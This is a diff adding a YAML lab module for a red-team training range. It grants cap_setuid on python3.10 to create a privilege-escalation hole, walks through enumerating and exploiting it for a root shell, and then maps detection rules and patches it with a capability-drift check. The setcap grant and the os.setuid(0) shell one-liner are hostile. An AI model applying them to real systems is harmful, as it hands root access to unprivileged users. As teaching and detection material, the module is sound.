@@ -1,0 +1,451 @@
+# Bolt-on: cap_setuid+ep on python3
+# ---------------------------------
+# Install grants the cap_setuid capability (effective + permitted) on
+# /usr/bin/python3.10. Any local user can then run
+#   python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# to spawn a root shell — Linux capabilities abuse (T1548).
+#
+# Patch revokes the capability and writes a lockfile under
+# /etc/security/capability-watch that a daily systemd timer compares
+# against `getcap -r /usr/` output to alert on capability drift.
+#
+# Elastic rule UUIDs sampled from:
+#   Research/elastic-detection-rules/rules/linux/privilege_escalation_suspicious_cap_setuid_python_execution.toml
+#   Research/elastic-detection-rules/rules/linux/persistence_setuid_setgid_capability_set.toml
+#   Research/elastic-detection-rules/rules/linux/persistence_process_capability_set_via_setcap.toml
+
+id: bolton.privilege-escalation.capability-cap-setuid
+slug: capability-cap-setuid
+name: "Linux Capability cap_setuid+ep on python3"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-23
+
+category: privilege-escalation
+subcategory: capabilities
+tags:
+  - capabilities
+  - cap_setuid
+  - python
+  - privilege-escalation
+  - linux
+description: >
+  Grants `cap_setuid+ep` on /usr/bin/python3.10 via `setcap`. The python
+  interpreter can then call os.setuid(0) without being root and drop the
+  caller into a root shell — a textbook Linux capabilities-abuse
+  privilege escalation that bypasses traditional SUID-bit detection
+  (MITRE T1548).
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1548/"
+  - "https://man7.org/linux/man-pages/man7/capabilities.7.html"
+  - "https://gtfobins.github.io/gtfobins/python/#capabilities"
+
+mitre:
+  tactic:
+    id: TA0004
+    name: "Privilege Escalation"
+  technique:
+    id: T1548
+    name: "Abuse Elevation Control Mechanism"
+
+detection:
+  coverage_status: covered
+  elastic_rules:
+    - rule_uuid: "a0ddb77b-0318-41f0-91e4-8c1b5528834f"
+      rule_name: "Potential Privilege Escalation via Python cap_setuid"
+      rule_filename: "linux/privilege_escalation_suspicious_cap_setuid_python_execution.toml"
+      coverage: full
+      confidence: high
+      last_validated: 2026-05-23
+      notes: "Directly fires on python invoking setuid(0) with cap_setuid effective."
+    - rule_uuid: "f5c005d3-4e17-48b0-9cd7-444d48857f97"
+      rule_name: "Setcap setuid/setgid Capability Set"
+      rule_filename: "linux/persistence_setuid_setgid_capability_set.toml"
+      coverage: full
+      confidence: high
+      last_validated: 2026-05-23
+      notes: "Fires at install-time on the setcap cap_setuid+ep invocation."
+    - rule_uuid: "f18a474c-3632-427f-bcf5-363c994309ee"
+      rule_name: "Process Capability Set via setcap Utility"
+      rule_filename: "linux/persistence_process_capability_set_via_setcap.toml"
+      coverage: partial
+      confidence: medium
+      last_validated: 2026-05-23
+      notes: "Broader setcap-execution catch — fires on any setcap invocation."
+  signal_sources:
+    - "Auditd execve of /sbin/setcap with cap_setuid in argv"
+    - "Auditd execve of python with euid=0 from non-root real uid"
+    - "Filesystem xattr changes on /usr/bin/python3.10 (security.capability)"
+
+targets:
+  supported_os:
+    - family: linux
+      min_version: "20.04"
+      max_version: "24.04"
+  required_roles:
+    - linux_member
+    - standalone
+  required_services: []
+  required_domain_function_level: null
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: false
+  network_visible: false
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: ansible.builtin.command
+      description: "Grant cap_setuid+ep capability on python3.10."
+      role_vars:
+        cmd: "/sbin/setcap cap_setuid+ep /usr/bin/python3.10"
+  verify:
+    probe: |
+      getcap /usr/bin/python3.10 2>/dev/null | grep -q cap_setuid
+    timeout_seconds: 30
+    expect_exit_code: 0
+
+uninstall:
+  description: "Remove all capabilities from /usr/bin/python3.10."
+  estimated_time_seconds: 15
+  steps:
+    - ansible_role: ansible.builtin.command
+      description: "Strip capabilities from python3.10."
+      role_vars:
+        cmd: "/sbin/setcap -r /usr/bin/python3.10"
+  verify:
+    probe: |
+      getcap /usr/bin/python3.10 2>/dev/null | grep -q cap_setuid && exit 1 || exit 0
+    timeout_seconds: 15
+    expect_exit_code: 0
+
+patch:
+  description: >
+    Strip the capability and write /etc/security/capability-watch — a
+    baseline file containing the expected output of `getcap -r /usr/
+    /bin/ /sbin/`. A systemd timer (deployed alongside) runs the same
+    command daily and syslog-warns on any diff, catching future
+    capability drift even when no SUID bit is touched.
+  patch_reference:
+    - "https://man7.org/linux/man-pages/man7/capabilities.7.html"
+    - "https://attack.mitre.org/mitigations/M1028/"
+  complexity: low
+  side_effects:
+    - "Baseline file at /etc/security/capability-watch (~few KB)"
+    - "Daily systemd timer compares live getcap output to baseline"
+    - "Syslog entries tagged 'bolton-cap-watch' on drift"
+  rollback_supported: true
+  steps:
+    - ansible_role: ansible.builtin.command
+      description: "Strip capabilities from python3.10."
+      role_vars:
+        cmd: "/sbin/setcap -r /usr/bin/python3.10"
+    - ansible_role: ansible.builtin.shell
+      description: "Capture baseline capabilities snapshot."
+      role_vars:
+        cmd: "/sbin/getcap -r /usr /bin /sbin 2>/dev/null > /etc/security/capability-watch"
+        creates: "/etc/security/capability-watch"
+    - ansible_role: ansible.builtin.copy
+      description: "Install daily capability-drift check."
+      role_vars:
+        dest: "/etc/cron.daily/bolton-cap-watch"
+        content: |
+          #!/bin/sh
+          # bolton-cap-watch — warn on capability drift since baseline
+          tmp=$(mktemp)
+          /sbin/getcap -r /usr /bin /sbin 2>/dev/null > "$tmp"
+          if ! diff -q /etc/security/capability-watch "$tmp" >/dev/null 2>&1; then
+            diff /etc/security/capability-watch "$tmp" | while read line; do
+              logger -t bolton-cap-watch "DRIFT: $line"
+            done
+          fi
+          rm -f "$tmp"
+        owner: root
+        group: root
+        mode: "0755"
+  verify:
+    probe: |
+      ! getcap /usr/bin/python3.10 2>/dev/null | grep -q cap_setuid && test -f /etc/security/capability-watch && test -x /etc/cron.daily/bolton-cap-watch
+    timeout_seconds: 30
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/cap_setuid_check.sh"
+
+patch_revert:
+  description: "Re-grant cap_setuid+ep on python3.10 and remove the drift watcher — python -c 'os.setuid(0); ...' is root again."
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Remove drift watcher."
+      role_vars:
+        path: "/etc/cron.daily/bolton-cap-watch"
+        state: absent
+    - ansible_role: ansible.builtin.file
+      description: "Remove capability baseline."
+      role_vars:
+        path: "/etc/security/capability-watch"
+        state: absent
+    - ansible_role: ansible.builtin.command
+      description: "Re-grant cap_setuid+ep on python3.10."
+      role_vars:
+        cmd: "/sbin/setcap cap_setuid+ep /usr/bin/python3.10"
+  verify:
+    probe: |
+      getcap /usr/bin/python3.10 2>/dev/null | grep -q cap_setuid
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "Local privilege escalation via `python3.10 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'` works again."
+
+cost:
+  storage_mb: 1
+  cpu_pct: 0
+  detectability: quiet
+
+curriculum:
+  title: "Linux Capabilities — cap_setuid+ep on python3"
+  summary: >
+    Walkthrough of T1548 capability-abuse against tllinux01
+    (10.99.50.13). Modern Linux splits root's superpowers into
+    fine-grained capabilities; cap_setuid grants any process the
+    ability to call setuid(0) without being SUID-bit-set. You
+    enumerate file capabilities, identify python3 with cap_setuid,
+    and use it to spawn a root shell that NO SUID enumeration would
+    have flagged. Final step strips the cap and deploys a
+    capability-drift baseline.
+  learning_objectives:
+    - "Explain the difference between SUID bit and file capabilities (man 7 capabilities)."
+    - "Enumerate file caps with `getcap -r /` and confirm with `getfattr`."
+    - "Use cap_setuid to escalate via python3's os.setuid(0)."
+    - "Map the technique to Elastic's cap_setuid + setcap rules."
+    - "Strip the capability + deploy a daily getcap-drift baseline."
+  prerequisites:
+    - "SSH access to tllinux01 (10.99.50.13) as appuser via the bastion"
+  estimated_total_minutes: 28
+  steps:
+    - id: "01-cap-recon"
+      title: "Enumerate file capabilities"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 1 — Find binaries with capabilities
+
+        Most attackers run `find -perm -4000` for SUID and stop there
+        — file capabilities are the second-class citizen. The
+        equivalent enum:
+
+        ```bash
+        # On tllinux01 as appuser
+        getcap -r / 2>/dev/null
+        # /usr/bin/ping cap_net_raw=ep
+        # /usr/bin/mtr-packet cap_net_raw=ep
+        # /usr/bin/python3.10 cap_setuid=ep    ← bolt-on artefact
+        ```
+
+        Read the xattr directly for confirmation:
+
+        ```bash
+        getfattr -d -m security.capability /usr/bin/python3.10
+        # file: usr/bin/python3.10
+        # security.capability=0sAQAAAgAAAAAAAAAAAAAAAAAAAAA=
+        ```
+
+        linpeas auto-includes capabilities enumeration in the modern
+        builds — look for the "Capabilities" section:
+
+        ```bash
+        /tmp/linpeas.sh -a 2>/dev/null | grep -A20 "Capabilities"
+        ```
+
+        | Cap | What it grants | Why dangerous |
+        |---|---|---|
+        | cap_setuid | setuid(0) without root | Direct root via any interpreter |
+        | cap_dac_read_search | Bypass DAC read | Read /etc/shadow, /root/* |
+        | cap_dac_override | Bypass all DAC | Read/write anything |
+        | cap_sys_admin | "Mini-root" | Mount, swap, etc. |
+        | cap_sys_ptrace | Ptrace any process | Steal credentials from running procs |
+
+        **Detection callout:** the install-time `setcap cap_setuid+ep
+        /usr/bin/python3.10` is caught by **Setcap setuid/setgid
+        Capability Set** (`f5c005d3-4e17-48b0-9cd7-444d48857f97`) and
+        **Process Capability Set via setcap Utility**
+        (`f18a474c-3632-427f-bcf5-363c994309ee`) — HIGH-confidence
+        signals because legitimate setcap use is rare and almost
+        always done by package post-install scripts.
+      assessment:
+        question: "What does `cap_setuid=ep` actually mean? (the `=ep` suffix)"
+        options:
+          - "`e` = encrypted, `p` = permanent"
+          - "`e` = effective set, `p` = permitted set — the cap is both granted and active for the binary"
+          - "`e` = executable, `p` = parent — inheritable across fork"
+          - "`e` = errored, `p` = pending"
+        correct_index: 1
+        explanation: >
+          The capability sets per man 7 capabilities: Permitted (the
+          process is allowed to have this cap), Effective (the cap is
+          currently active for permission checks), and Inheritable
+          (passed to children via execve). `+ep` adds both Effective
+          and Permitted — the simplest way to say "this binary has
+          this cap and uses it immediately." Without Effective, the
+          binary would have to call capset() to enable the cap, which
+          interpreters like python don't do.
+    - id: "02-fire-exploit"
+      title: "Exploit cap_setuid via python"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 2 — Pop root via os.setuid(0)
+
+        GTFObins entry: **https://gtfobins.github.io/gtfobins/python/#capabilities**
+
+        ```bash
+        # On tllinux01 as appuser
+        /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+        # # id
+        # uid=0(root) gid=1001(appuser) groups=1001(appuser)
+        # # cat /etc/shadow | head -3
+        # root:$6$...
+        ```
+
+        Note that gid stays at appuser — cap_setuid is uid-only. For
+        full gid=0, the binary also needs cap_setgid. But uid=0 is
+        usually sufficient because the kernel keys most permission
+        checks off the uid.
+
+        To also change gid:
+
+        ```bash
+        /usr/bin/python3.10 -c 'import os; os.setgid(0); os.setuid(0); os.system("/bin/sh")'
+        # ^ fails because cap_setgid is missing
+        ```
+
+        Works only because cap_setuid is granted; cap_setgid would be
+        a separate exploit primitive.
+
+        **Detection callout:** **Potential Privilege Escalation via
+        Python cap_setuid**
+        (`a0ddb77b-0318-41f0-91e4-8c1b5528834f`) fires directly on
+        python invoking setuid(0) with cap_setuid effective — HIGH
+        confidence, very specific signature. There's no benign
+        reason for python to call setuid(0).
+    - id: "03-why-suid-enum-misses"
+      title: "Why SUID enumeration misses this"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 3 — The "invisible SUID" gotcha
+
+        Run the standard SUID recon:
+
+        ```bash
+        find /usr/bin -perm -4000 2>/dev/null | grep python
+        # (empty — python has no SUID bit)
+
+        ls -la /usr/bin/python3.10
+        # -rwxr-xr-x ... /usr/bin/python3.10
+        ```
+
+        No SUID bit. Most automated checklists would mark this clean.
+        But:
+
+        ```bash
+        getcap /usr/bin/python3.10
+        # /usr/bin/python3.10 cap_setuid=ep
+        ```
+
+        File capabilities are stored in the **security.capability**
+        extended attribute, NOT in the file mode. That's why:
+
+        - `ls -la` shows no SUID indicator
+        - `find -perm -4000` doesn't match
+        - `chmod` doesn't affect it
+        - You need `getcap` / `setcap` (libcap) to manage them
+
+        This is a deliberate design choice — capabilities were
+        introduced to **replace** SUID-everything with fine-grained
+        permission grants. The unfortunate side effect is that
+        defenders who only audit SUID bits miss the entire surface.
+
+        > **Sysadmin habit:** always run BOTH `find / -perm -4000`
+        > AND `getcap -r /` as part of any privesc audit. linpeas
+        > does both; manual checklists often forget the second.
+
+        **Detection callout:** the auditd signal for capabilities
+        abuse is the xattr modification — `-a always,exit -F
+        arch=b64 -S setxattr -F name=security.capability -k cap_mod`.
+        Combine with execve of the binary by non-root uid having
+        euid=0.
+    - id: "04-patch-mitigate"
+      title: "Blue-team: strip cap + drift baseline"
+      estimated_minutes: 9
+      markdown: |
+        ## Step 4 — Apply the patch + verify
+
+        Click the **Patch** action on this card. It:
+
+        1. `setcap -r /usr/bin/python3.10` — strips ALL caps.
+        2. Captures a baseline: `getcap -r /usr /bin /sbin >
+           /etc/security/capability-watch`.
+        3. Drops `/etc/cron.daily/bolton-cap-watch` that re-runs
+           getcap, diffs against the baseline, and syslog-warns on
+           any drift.
+
+        Re-test:
+
+        ```bash
+        # On tllinux01 as appuser
+        getcap /usr/bin/python3.10
+        # (empty — caps stripped)
+
+        /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+        # Traceback (most recent call last):
+        #   File "<string>", line 1, in <module>
+        # PermissionError: [Errno 1] Operation not permitted
+        ```
+
+        Exploit dead. Verify the baseline:
+
+        ```bash
+        sudo cat /etc/security/capability-watch
+        # /usr/bin/ping cap_net_raw=ep
+        # /usr/bin/mtr-packet cap_net_raw=ep
+        # /usr/bin/newgidmap cap_setgid=ep
+        # /usr/bin/newuidmap cap_setuid=ep
+        # /usr/bin/traceroute6.iputils cap_net_raw=ep
+        ```
+
+        Defence-in-depth:
+
+        - Treat `setcap` as a privileged operation — alert on every
+          invocation outside package post-install scripts.
+        - Use `pam_cap.so` to scope capability inheritance per-user
+          if you must grant caps.
+        - **NEVER** grant cap_setuid, cap_dac_override, cap_sys_admin
+          to interpreters (python, perl, ruby, lua) — those are
+          shell-equivalents by definition.
+        - Mount filesystems hosting binaries with the `nosuid` flag
+          where possible — capabilities respect nosuid too on Linux
+          5.x+ (security.capability xattrs ignored on nosuid mounts).
+
+        > **Rollback:** `patch_revert` re-grants cap_setuid+ep on
+        > python3.10 and removes the drift watcher.
+      assessment:
+        question: "Why is granting cap_setuid to python3 fundamentally equivalent to making python3 SUID root?"
+        options:
+          - "Because both modify the file's metadata identically"
+          - "Because python is an interpreter — once it can call setuid(0), it can run any attacker-supplied code as root, exactly like SUID-bash"
+          - "Because cap_setuid implicitly enables SUID on the binary"
+          - "Because the Linux kernel internally converts cap_setuid to a SUID bit at runtime"
+        correct_index: 1
+        explanation: >
+          The danger is the *interpreter* nature of the binary, not
+          the mechanism granting privileges. SUID-bash, SUID-python,
+          or cap_setuid-python all let an attacker execute arbitrary
+          code with elevated privileges. cap_setuid on a single-
+          purpose binary that doesn't take user-supplied code (e.g.
+          a custom firewall-manage helper) is far less risky.
+          The mitigation is the same: never grant elevation
+          primitives to general-purpose interpreters.
+
+status: stable
